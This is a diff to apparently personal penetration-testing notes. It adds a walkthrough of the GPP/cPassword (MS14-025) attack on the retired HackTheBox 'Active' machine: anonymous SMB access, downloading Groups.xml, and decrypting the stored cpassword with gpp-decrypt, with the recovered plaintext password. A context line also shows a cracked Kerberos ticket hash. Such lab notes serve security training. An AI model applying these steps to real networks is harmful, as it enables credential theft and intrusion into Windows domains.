@@ -571,6 +571,39 @@ C:\Windows\system32>
   $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$eb6[STRIPPED]6bc:MYpassword123#
   ```
 
+## GPP / cPassword Attacks Overview - MS14-025
+
+- GPP will keep passwords in an XML file
+- Works with smb
+- If we find a 334 open we can try to login anonymously
+  *Example from HTB - Active - Retired Machine*
+- Tips: `prompt off` (will not prompt when dl file) and `recurse on` (will list everything)
+    ```
+    ┌──(kali㉿kali)-[~]
+    └─$ smbclient \\\\10.10.10.100\\Replication
+    Enter WORKGROUP\kali's password: 
+    Anonymous login successful
+    Try "help" to get a list of possible commands.
+    smb: \> dir
+      .                                   D        0  Sat Jul 21 06:37:44 2018
+      ..                                  D        0  Sat Jul 21 06:37:44 2018
+      active.htb                          D        0  Sat Jul 21 06:37:44 2018
+
+                    5217023 blocks of size 4096. 260455 blocks available
+    smb: \> prompt off
+    smb: \> 
+    ```
+- We can get all the file using `mget *`
+- We are interested in the group.xml file which has been downloaded in `active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/`  
+  ![](../.res/groupsxml.png)
+- We can just copy cpassword and carckit using gpp-decrypt: ` gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
+  And we get the password: `GPPstillStandingStrong2k18`
+  
+
+### GPP - Resources
+
+- [Group Policy Pwnage](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)
+
 
 ## Quick Recap
 
